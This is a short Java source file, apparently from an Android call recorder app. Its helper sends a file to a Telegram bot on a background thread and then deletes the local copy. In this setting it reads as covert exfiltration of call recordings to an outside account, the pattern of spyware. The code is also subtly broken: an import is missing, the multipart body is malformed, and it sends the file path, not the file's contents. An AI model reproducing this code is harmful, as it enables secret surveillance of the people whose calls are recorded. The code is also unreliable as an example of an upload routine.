package com.example.callvoicerecorder;

import java.io.File;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MultipartUtility {
    public static void sendToTelegram(Context context, File file, String type) {
        new Thread(() -> {
            try {
                String urlString = "https://api.telegram.org/bot" + Constants.TELEGRAM_BOT_TOKEN + "/sendDocument";
                HttpURLConnection conn = (HttpURLConnection) new URL(urlString).openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "multipart/form-data");
                conn.setDoOutput(true);
                
                OutputStream os = conn.getOutputStream();
                os.write(("chat_id=" + Constants.TELEGRAM_CHAT_ID).getBytes());
                os.write(("document=" + file.getAbsolutePath()).getBytes());
                os.flush();
                os.close();

                file.delete(); // Delete after sending
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}
